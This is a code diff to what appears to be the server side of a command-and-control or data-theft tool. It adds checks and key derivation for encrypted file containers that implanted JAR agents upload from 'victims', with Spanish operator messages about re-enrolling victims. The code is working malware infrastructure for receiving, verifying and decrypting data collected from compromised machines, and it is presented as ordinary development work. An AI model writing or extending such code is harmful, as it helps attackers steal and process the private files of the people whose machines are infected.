@@ -9,9 +9,10 @@ import { basename, dirname, join, normalize, sep } from 'node:path';
 import type { Artifact, Upload, Victim } from '@prisma/client';
 import { prisma } from '../lib/db';
 import { env } from '../lib/env';
-import { artifactKey, openSecret, sha256hex } from '../lib/crypto';
+import { artifactKey, hmac, openBuildSecret, openSecretLoose, sha256hex } from '../lib/crypto';
 import { publish } from '../lib/bus';
 import { notify } from './notify';
+import { saltForEpoch } from './victim';
 
 export const uploadDir = (id: string) => join(env.STORAGE_DIR, 'uploads', `${id}.bin`);
 export const artifactDir = (id: string) => join(env.STORAGE_DIR, 'artifacts', id);
@@ -109,6 +110,7 @@ export async function commitUpload(upload: Upload, sha256: string, chunkCount: n
   if (hash.digest('hex') !== sha256 || sha256 !== upload.sha256) {
     throw new HttpError(409, 'hash_mismatch', 'container sha256 differs');
   }
+  await probeContainer(upload);
   const dir = artifactDir(upload.id);
   await mkdir(dir, { recursive: true });
   const artifact = await prisma.artifact.upsert({
@@ -133,6 +135,83 @@ export async function commitUpload(upload: Upload, sha256: string, chunkCount: n
   return artifact;
 }
 
+
+/**
+ * Verifies the manifest identity and the artifact key before the upload is
+ * accepted. Scheme 2 carries a key probe, so a wrong jar is rejected in
+ * milliseconds instead of failing later with an opaque GCM error. Legacy
+ * scheme 1 has no probe: decrypt the smallest blob for the same certainty.
+ */
+async function probeContainer(upload: Upload): Promise<void> {
+  const { HttpError } = await import('../lib/errors');
+  const victim = await prisma.victim.findUniqueOrThrow({ where: { id: upload.victimId }, include: { build: true } });
+  const fd = await open(upload.path, 'r');
+  try {
+    let cursor = 0;
+    const manifestLine = await readLine(fd, cursor);
+    cursor += manifestLine.bytes;
+    const hashLine = await readLine(fd, cursor);
+    cursor += hashLine.bytes;
+    if (sha256hex(manifestLine.text) !== hashLine.text.trim()) throw new HttpError(422, 'manifest_sha_mismatch', 'manifest hash differs');
+    const manifest = JSON.parse(manifestLine.text) as Manifest;
+    if (manifest.container_version !== 1 || manifest.victim_id !== victim.id) {
+      throw new HttpError(422, 'artifact_key_mismatch',
+        `manifest victim ${manifest.victim_id} does not match ${victim.id}`, 0,
+        { build_id_agent: manifest.build_id, build_id_server: victim.build.buildId, victim_id_agent: manifest.victim_id });
+    }
+    if (manifest.build_id !== victim.build.buildId) {
+      throw new HttpError(422, 'artifact_key_mismatch',
+        'el build_secret del agente no corresponde al build de la víctima; reinstala el JAR o vuelve a enrolar', 0,
+        { build_id_agent: manifest.build_id, build_id_server: victim.build.buildId, victim_id_agent: manifest.victim_id });
+    }
+    const scheme = manifest.key_scheme ?? victim.keyScheme;
+    const epoch = manifest.key_epoch ?? 1;
+    if (epoch > victim.keyEpoch) {
+      throw new HttpError(422, 'key_epoch_unknown',
+        `el agente usa el epoch ${epoch} y la víctima está en ${victim.keyEpoch}`, 0,
+        { build_id_agent: manifest.build_id, build_id_server: victim.build.buildId, victim_id_agent: manifest.victim_id });
+    }
+    let key: Buffer;
+    try {
+      key = await blobKey(victim.id, Buffer.from(manifest.nonce_prefix, 'base64url'), scheme, epoch);
+    } catch {
+      throw new HttpError(422, 'artifact_key_mismatch',
+        'falta el key_salt de la víctima; vuelve a enrolar', 0,
+        { build_id_agent: manifest.build_id, build_id_server: victim.build.buildId, victim_id_agent: manifest.victim_id });
+    }
+    if (scheme === 2) {
+      if (!manifest.key_probe || manifest.key_probe !== hmac(key, 'probe').toString('base64url')) {
+        throw new HttpError(422, 'artifact_key_mismatch',
+          'la clave de artefacto no coincide con la víctima; reinstala el JAR o vuelve a enrolar', 0,
+          { build_id_agent: manifest.build_id, build_id_server: victim.build.buildId, victim_id_agent: manifest.victim_id });
+      }
+      return;
+    }
+    // Legacy containers: the smallest blob is enough and usually tiny.
+    let best: { item: Manifest['artifacts'][number]; index: number; start: number; length: number } | null = null;
+    for (let index = 0; index < manifest.artifacts.length; index++) {
+      const header = await readLine(fd, cursor);
+      cursor += header.bytes;
+      const [tag, id, lengthText] = header.text.trim().split(' ');
+      const length = Number(lengthText);
+      if (tag !== 'BLOB' || !id || !Number.isInteger(length) || length < 17) throw new HttpError(422, 'blob_header_invalid', 'bad blob header');
+      const item = manifest.artifacts[index]!;
+      if (!best || item.size < best.item.size) best = { item, index, start: cursor, length };
+      cursor += length;
+    }
+    if (!best) throw new HttpError(422, 'manifest_invalid', 'empty manifest');
+    const dest = `${upload.path}.probe`;
+    const nonce = Buffer.concat([Buffer.from(manifest.nonce_prefix, 'base64url'), Buffer.alloc(4)]);
+    nonce.writeUInt32BE(best.index, 8);
+    await decipherBlob(upload.path, best.start, best.length, key, nonce,
+      Buffer.from(`${sha256hex(manifestLine.text)}:${best.item.id}`), dest, best.item.sha256, best.item.size,
+      best.item.size);
+    await rm(dest, { force: true });
+  } finally {
+    await fd.close();
+  }
+}
+
 async function closeTaskFromArtifact(artifact: Artifact): Promise<void> {
   if (!artifact.taskId) return;
   const task = await prisma.task.findUnique({ where: { id: artifact.taskId } });
@@ -151,10 +230,15 @@ async function closeTaskFromArtifact(artifact: Artifact): Promise<void> {
   }
 }
 
-async function blobKey(victimId: string, artifact: Artifact, noncePrefix: Buffer): Promise<Buffer> {
+async function blobKey(victimId: string, noncePrefix: Buffer, scheme: number, epoch: number): Promise<Buffer> {
   const victim = await prisma.victim.findUniqueOrThrow({ where: { id: victimId }, include: { build: true } });
-  const secret = victim.build.secret;
-  return artifactKey(secret, victim.build.buildId, victim.id, noncePrefix);
+  const secret = openBuildSecret(victim.build.secret);
+  let salt: Buffer | undefined;
+  if (scheme === 2) {
+    salt = (await saltForEpoch(victim.id, epoch)) ?? undefined;
+    if (!salt) throw new Error('artifact_key_salt');
+  }
+  return artifactKey(secret, victim.build.buildId, victim.id, noncePrefix, salt, scheme, epoch);
 }
 
 type Manifest = {
@@ -166,6 +250,9 @@ type Manifest = {
   module: string;
   created_at: number;
   nonce_prefix: string;
+  key_probe?: string;
+  key_scheme?: 1 | 2;
+  key_epoch?: number;
   total_size: number;
   artifacts: Array<{ id: string; path: string; kind: string; size: number; sha256: string; mode?: number }>;
 };
@@ -258,7 +345,7 @@ export async function processArtifact(artifactId: string): Promise<void> {
         throw new Error('manifest_invalid');
       }
       const noncePrefix = Buffer.from(manifest.nonce_prefix, 'base64url');
-      const key = await blobKey(artifact.victimId, artifact, noncePrefix);
+      const key = await blobKey(artifact.victimId, noncePrefix, manifest.key_scheme ?? 1, manifest.key_epoch ?? 1);
       const root = artifactDir(artifact.id);
       await mkdir(root, { recursive: true });
       if (manifest.artifacts.length > 20000) throw new Error('too_many_entries');
@@ -400,7 +487,7 @@ async function readLine(fd: Awaited<ReturnType<typeof open>>, at: number): Promi
   const chunks: Buffer[] = [];
   let total = 0;
   const buffer = Buffer.alloc(1);
-  for (let i = 0; i < 8 * 1024 * 1024; i++) {
+  for (let i = 0; i < 16 * 1024 * 1024; i++) {
     const { bytesRead } = await fd.read(buffer, 0, 1, at + total);
     if (!bytesRead) break;
     total++;
